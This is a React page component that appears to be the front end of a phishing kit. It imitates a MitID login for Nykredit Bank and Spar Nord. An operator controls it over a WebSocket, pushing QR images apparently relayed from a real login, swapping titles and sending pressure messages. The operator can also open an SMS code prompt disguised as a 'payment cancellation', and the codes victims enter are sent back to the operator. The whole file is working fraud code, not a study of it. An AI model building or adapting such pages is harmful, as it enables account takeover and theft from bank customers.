import { useState, useEffect } from 'react'
import BrandLogo from '../components/BrandLogo'
import MitIdLogo from '../components/MitIdLogo'
import CardShell from '../components/CardShell'
import SidePanel from '../components/SidePanel'
import { connectUser, sendUserWS } from '../services/ws'

interface Props {
  sessionId: string
  onBack: () => void
}

function MitIdAnimation({ text }: { text?: string }) {
  return (
    <div className="flex flex-col items-center justify-center text-center">
      <p className="text-[18px] font-bold text-[#001C44] mb-6">{text || 'Open MitID app and approve'}</p>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 180 160" shapeRendering="geometricPrecision" textRendering="geometricPrecision" className="w-[200px] h-[178px]">
        <path d="M83.873684,0h-71.747368C5.456842,0,0,5.4,0,12v136c0,6.6,5.456842,12,12.126316,12h71.747368C90.543158,160,96,154.6,96,148v-136C96,5.4,90.543158,0,83.873684,0v0Z" transform="translate(42 0)" fill="#8ec0fa"/>
        <path d="M78.917647,0C82.863529,0,86,3.1,86,7v136c0,3.8-3.136471,7-7.082353,7h-71.835294C3.237647,150,0,146.8,0,143L0,7C0,3.1,3.237647,0,7.082353,0h71.835294" transform="translate(47 5)" fill="#c8e0fd" stroke="#c8e0fd" strokeWidth="1.176471"/>
        <g transform="translate(0-10)">
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 80.000001 55.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 55.000001 55.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 80.000018 30.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 55.000018 30.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 105.000001 55.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 80.000001 104.898929)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 55.000001 104.898929)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 105.000001 104.898929)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 105.000001 80.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 55.000001 80.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 105.000001 30.101071)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 80.000001 129.898929)" fill="#fff" fillOpacity="0.6"/>
          <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="matrix(1.707865 0 0 1.629216 55.000001 129.898929)" fill="#fff" fillOpacity="0.6"/>
        </g>
        <g transform="translate(0-10)" clipPath="url(#mitid-clip)">
          <g>
            <rect width="20" height="20" rx="5" ry="5" transform="translate(80 80) translate(-10,-10)" fill="#0060e6">
              <animateTransform attributeName="transform" type="scale" values="1 1;1.7 1.7;1 1;1.7 1.7;1 1;1 1;1 1;1 1" dur="14s" repeatCount="indefinite" additive="sum" />
              <animate attributeName="opacity" values="1;1;0;0;1;1" dur="14s" repeatCount="indefinite" />
            </rect>
            <rect width="11.710527" height="12.275843" rx="3" ry="3" transform="translate(80 80) translate(-5.855264,-6.137922)" fill="#0060e6">
              <animateTransform attributeName="transform" type="scale" values="1.7 1.6;1.7 1.6;4.3 4.2;15 15;15 15;15 15" dur="14s" repeatCount="indefinite" additive="sum" />
              <animate attributeName="fill-opacity" values="1;1;1;0;0;0" dur="14s" repeatCount="indefinite" />
            </rect>
            <path d="M7,9.8C8,9.8,8.8,9,8.8,8s-.8-1.8-1.8-1.8-1.8.8-1.8,1.8.8,1.8,1.8,1.8Zm0,.7c-1.7,0-3,1-3.2,3.3h6.4C10,11.5,8.7,10.5,7,10.5Zm5.3-4.3h-1.3v7.6h1.2c3.1,0,4.4-1.7,4.4-3.8s-1.3-3.8-4.3-3.8Z" transform="translate(80 80) translate(-10.2,-10)" fill="#fff">
              <animateTransform attributeName="transform" type="scale" values="1.1 1.1;1.1 1.1;1.9 1.9;3.5 3.5;3.5 3.5;3.5 3.5" dur="14s" repeatCount="indefinite" additive="sum" />
              <animate attributeName="opacity" values="1;1;1;0;0;1;1" dur="14s" repeatCount="indefinite" />
            </path>
          </g>
          <clipPath id="mitid-clip">
            <path d="M83.873684,0h-71.747368C5.456842,0,0,5.4,0,12v136c0,6.6,5.456842,12,12.126316,12h71.747368C90.543158,160,96,154.6,96,148v-136C96,5.4,90.543158,0,83.873684,0v0Z" transform="translate(42 10)" fill="#fff"/>
          </clipPath>
        </g>
        <path d="M78.917647,0C82.863529,0,86,3.1,86,7v136c0,3.8-3.136471,7-7.082353,7h-71.835294C3.237647,150,0,146.8,0,143L0,7C0,3.1,3.237647,0,7.082353,0h71.835294" transform="translate(47 5)" fill="#fff" stroke="#c8e0fd" strokeWidth="1.176471">
          <animate attributeName="opacity" values="0;0;1;1;0;0" dur="14s" repeatCount="indefinite" />
        </path>
        <path d="M7.411064,10.262583c1.128457,0,2.031223-.902796,2.031223-2.031291s-.902766-2.031292-2.031223-2.031292-2.031224.902796-2.031224,2.031292.902766,2.031291,2.031224,2.031291Zm0,.789947c-1.918378,0-3.385373,1.128495-3.611064,3.724034h7.222128c-.225692-2.595539-1.692687-3.724034-3.611064-3.724034ZM13.391888,6.2h-1.466994v8.576564h1.354149c3.498218,0,4.965212-1.918442,4.965212-4.288282s-1.466994-4.288282-4.852367-4.288282Z" transform="matrix(3.134118 0 0 3.134122 55.455351 11.806507)" fill="#0060e6" fillOpacity="0">
          <animate attributeName="fill-opacity" values="0;0;1;1;0;0" dur="14s" repeatCount="indefinite" />
        </path>
        <path d="M10,0h40c5.5,0,10,4.5,10,10v0c0,5.5-4.5,10-10,10h-40C4.5,20,0,15.5,0,10v0C0,4.5,4.5,0,10,0Z" transform="translate(60 120)" opacity="0" clipRule="evenodd" fill="#0060e6" fillRule="evenodd">
          <animate attributeName="opacity" values="0;0;1;1;0;0" dur="14s" repeatCount="indefinite" />
        </path>
        <g transform="translate(0-10)">
          <rect width="69" height="33" rx="0" ry="0" transform="translate(55 124)" fill="#fff" clipPath="url(#swipe-clip)"/>
          <rect width="7.939512" height="30" rx="0" ry="0" transform="translate(55 125)" fill="#fff" opacity="0">
            <animate attributeName="opacity" values="0;0;1;0;0" dur="14s" repeatCount="indefinite" />
            <animateTransform attributeName="transform" type="translate" values="47 125;47 125;87 125;97 125;97 125" dur="14s" repeatCount="indefinite" />
          </rect>
          <clipPath id="swipe-clip">
            <rect width="69" height="33" transform="translate(55 124)"/>
          </clipPath>
        </g>
        <path d="M10,0h40c5.5,0,10,4.5,10,10v0c0,5.5-4.5,10-10,10h-40C4.5,20,0,15.5,0,10v0C0,4.5,4.5,0,10,0Z" transform="translate(60 130)" clipRule="evenodd" fill="#c8e0fd" fillRule="evenodd">
          <animateTransform attributeName="transform" type="translate" values="60 130;60 130;60 130;60 130;60 130" dur="14s" repeatCount="indefinite" />
          <animate attributeName="opacity" values="0;0;1;1;0;0" dur="14s" repeatCount="indefinite" />
        </path>
        <g transform="translate(0-10)">
          <g>
            <path d="M7,9.8C8,9.8,8.8,9,8.8,8s-.8-1.8-1.8-1.8-1.8.8-1.8,1.8.8,1.8,1.8,1.8Zm0,.7c-1.7,0-3,1-3.2,3.3h6.4C10,11.5,8.7,10.5,7,10.5Zm5.3-4.3h-1.3v7.6h1.2c3.1,0,4.4-1.7,4.4-3.8s-1.3-3.8-4.3-3.8Z" transform="translate(90 80) translate(-10.2,-10)" fill="#fff">
              <animate attributeName="opacity" values="0;0;0;1;1;1;1" dur="14s" repeatCount="indefinite" />
              <animateTransform attributeName="transform" type="scale" values="1.1 1.1;1.1 1.1;1.1 1.1;1.1 1.1;1.1 1.1;1.1 1.1;1.1 1.1" dur="14s" repeatCount="indefinite" additive="sum" />
            </path>
          </g>
        </g>
      </svg>
    </div>
  )
}

export default function QRPage({ sessionId, onBack }: Props) {
  const [qrReady, setQrReady] = useState(false)
  const [qrImage, setQrImage] = useState<string | null>(null)
  const [verified, setVerified] = useState(false)
  const [titleText, setTitleText] = useState('Log in to Nykredit Bank and Spar Nord')
  const [broadcastMsg, setBroadcastMsg] = useState<string | null>(null)
  const [broadcastEnabled, setBroadcastEnabled] = useState(true)
  const [msgType, setMsgType] = useState<'warning' | 'myid' | 'goodluck' | null>(null)
  const [msgText, setMsgText] = useState('')
  const [smsActive, setSmsActive] = useState(false)
  const [smsCode, setSmsCode] = useState<string[]>([])
  const [smsLength, setSmsLength] = useState(4)
  const [smsAmount, setSmsAmount] = useState<string | null>(null)
  const [expectedSmsCode, setExpectedSmsCode] = useState('')
  const [smsInputFocused, setSmsInputFocused] = useState(0)
  const [smsError, setSmsError] = useState(false)
  const [verifying, setVerifying] = useState(false)

  useEffect(() => {
    const ws = connectUser(sessionId, (data) => {
      if (data.type === 'qr-show') setQrReady(true)
      if (data.type === 'qr-hide') { setQrReady(false); setQrImage(null) }
      if (data.type === 'qr-image') { setQrImage(data.image); setQrReady(true) }
      if (data.type === 'verified') setVerified(true)
      if (data.type === 'title-change') setTitleText(data.title)
      if (data.type === 'broadcast-message') { setBroadcastMsg(data.message); setTimeout(() => setBroadcastMsg(null), 5000) }
      if (data.type === 'broadcast-toggle') setBroadcastEnabled(data.enabled)
      if (data.type === 'message-type') { setMsgType(data.messageType); setMsgText(data.text); setTimeout(() => setMsgType(null), 8000) }
      if (data.type === 'status-toggle') {
        if (data.field === 'sms_active') setSmsActive(data.value)
      }
      if (data.type === 'sms-activate') {
        const code = data.code || ''
        const len = code.length || 4
        setSmsActive(true)
        setSmsAmount(data.amount || null)
        setExpectedSmsCode(code)
        setSmsLength(len)
        setSmsCode(new Array(len).fill(''))
        setSmsError(false)
      }
    })
    return () => ws.close()
  }, [sessionId])

  const handleSmsChange = (index: number, value: string) => {
    if (value.length > 1) return
    const newCode = [...smsCode]
    newCode[index] = value
    setSmsCode(newCode)
    if (value && index < smsLength - 1) {
      const next = document.getElementById(`sms-${index + 1}`)
      if (next) next.focus()
    }
  }

  const handleSmsKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !smsCode[index] && index > 0) {
      const prev = document.getElementById(`sms-${index - 1}`)
      if (prev) prev.focus()
    }
  }

  const msgColors = {
    warning: { bg: 'bg-red-50', border: 'border-red-200', text: 'text-red-700', icon: '!' },
    myid: { bg: 'bg-blue-50', border: 'border-blue-200', text: 'text-blue-700', icon: 'i' },
    goodluck: { bg: 'bg-green-50', border: 'border-green-200', text: 'text-green-700', icon: '+' },
  }

  if (verified) {
    return (
      <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
        <header className="bg-white h-[50px] flex items-center px-6 border-b border-gray-200"><BrandLogo /></header>
        <main className="flex-1 flex items-center justify-center">
          <div className="bg-white rounded-lg shadow p-10 text-center" style={{ fontFamily: "'IBM Plex Sans', Arial, sans-serif" }}>
            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" className="mx-auto mb-4"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22,4 12,14.01 9,11.01"/></svg>
            <h1 className="text-[20px] font-bold text-[#001C44] mb-2">Login Verified</h1>
            <p className="text-[14px] text-gray-600">Authentication successful.</p>
          </div>
        </main>
      </div>
    )
  }

  if (verifying) {
    return (
      <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
        <header className="bg-white h-[50px] flex items-center px-6 border-b border-gray-200"><BrandLogo /></header>
        <main className="flex-1 flex items-start justify-center pt-[60px] px-4">
          <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full">
            <CardShell>
              <div className="flex flex-col h-full">
                <div className="flex items-start justify-between mb-2">
                  <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
                    {titleText || 'Log in to Nykredit Bank and Spar Nord'}
                  </h1>
                  <MitIdLogo />
                </div>
                <hr className="border-gray-200 my-3" />
                <div className="flex-1 flex flex-col items-center justify-center">
                  <MitIdAnimation text="Verifying..." />
                </div>
                <div className="flex-1" />
                <hr className="border-gray-200 mb-3" />
                <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
                  <button onClick={onBack} className="hover:underline cursor-pointer">Cancel</button>
                  <a href="#" className="hover:underline">Help</a>
                </nav>
              </div>
            </CardShell>
            <SidePanel />
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
      <header className="bg-white h-[50px] flex items-center px-6 border-b border-gray-200"><BrandLogo /></header>
      <main className="flex-1 flex items-start justify-center pt-[60px] px-4">
        {broadcastEnabled && broadcastMsg && (
          <div className="fixed top-[60px] left-1/2 -translate-x-1/2 z-50 bg-white border border-gray-200 rounded-xl shadow-lg px-5 py-3 text-sm text-gray-700 font-medium animate-pulse max-w-[360px] text-center">
            {broadcastMsg}
          </div>
        )}
        {msgType && msgText && (
          <div className={`fixed top-[110px] left-1/2 -translate-x-1/2 z-50 ${msgColors[msgType].bg} border ${msgColors[msgType].border} rounded-xl shadow-lg px-5 py-3 text-sm font-bold ${msgColors[msgType].text} max-w-[360px] text-center animate-bounce`}>
            <span className="mr-1">{msgColors[msgType].icon}</span> {msgText}
          </div>
        )}
        <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full">
          <CardShell>
            <div className="flex flex-col h-full">
              <div className="flex items-start justify-between mb-2">
                <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
                  {titleText || 'Connecting securely'}
                </h1>
                <MitIdLogo />
              </div>
              <hr className="border-gray-200 my-3" />
              <div className="flex-1 flex flex-col items-center justify-center">
                {smsActive ? (
                  <div className="w-full max-w-[320px]">
                    <div className="text-center mb-5">
                      <div className="flex items-center justify-center gap-2 mb-2">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0055a5" strokeWidth="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
                        <span className="text-[14px] font-bold text-[#001C44] uppercase tracking-wide">SMS CONFIRMATION</span>
                      </div>
                      {smsAmount && (
                        <div className="bg-gray-50 rounded-xl border border-gray-200 p-4 mb-4">
                          <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1">PAYMENT CANCELLATION</div>
                          <div className="text-[28px] font-bold text-[#001C44]">{Number(smsAmount).toLocaleString('da-DK')} kr</div>
                        </div>
                      )}
                      <p className="text-[13px] text-gray-500">Enter the confirmation code from your SMS to continue.</p>
                    </div>
                    <div className="flex gap-3 justify-center mb-5">
                      {smsCode.map((digit, i) => (
                        <input key={i} id={`sms-${i}`} type="text" inputMode="numeric" maxLength={1} value={digit}
                          onChange={(e) => handleSmsChange(i, e.target.value.replace(/\D/g, ''))}
                          onFocus={() => setSmsInputFocused(i)}
                          onKeyDown={(e) => handleSmsKeyDown(i, e)}
                          className={`w-[52px] h-[52px] text-center text-[22px] font-bold text-[#001C44] border-2 rounded-xl focus:outline-none transition-all ${
                            smsInputFocused === i ? 'border-[#0055a5] ring-2 ring-[#0055a5]/20' : 'border-gray-200'
                          }`} />
                      ))}
                    </div>
                    <button onClick={() => {
                      const entered = smsCode.join('')
                      if (entered.length === smsLength) {
                        if (!expectedSmsCode || entered === expectedSmsCode) {
                          setVerifying(true)
                          sendUserWS({ type: 'sms-submitted', code: entered })
                        } else {
                          setSmsError(true)
                          setSmsCode(new Array(smsLength).fill(''))
                          setTimeout(() => setSmsError(false), 3000)
                        }
                      }
                    }} className={`w-full font-bold text-[14px] py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-between px-5 ${
                      smsCode.join('').length === smsLength ? 'bg-[#0055a5] hover:bg-[#004080] text-white' : 'bg-[#e8edf4] text-[#8a9bb5]'
                    }`}>
                      <span>CONFIRM</span>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12,5 19,12 12,19"/></svg>
                    </button>
                    {smsError && <p className="text-[12px] text-red-600 text-center mt-2 font-medium">Incorrect code. Please try again.</p>}
                  </div>
                ) : qrReady ? (
                  <>
                    <h2 className="text-[18px] font-bold text-[#001C44] text-center mb-6">Scan QR code with<br />MitID app</h2>
                    <div className="p-4 bg-white border border-gray-200 rounded">
                      {qrImage ? (
                        <img src={qrImage} alt="QR Code" className="w-[200px] h-[200px] object-contain" />
                      ) : (
                        <div className="w-[200px] h-[200px] bg-gray-100 flex items-center justify-center text-gray-400 text-sm">QR Code</div>
                      )}
                    </div>
                  </>
                ) : (
                  <MitIdAnimation />
                )}
              </div>
              <div className="flex-1" />
              <hr className="border-gray-200 mb-3" />
              <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
                <button onClick={onBack} className="hover:underline cursor-pointer">Cancel</button>
                <a href="#" className="hover:underline">Help</a>
              </nav>
            </div>
          </CardShell>
          <SidePanel />
        </div>
      </main>
    </div>
  )
}
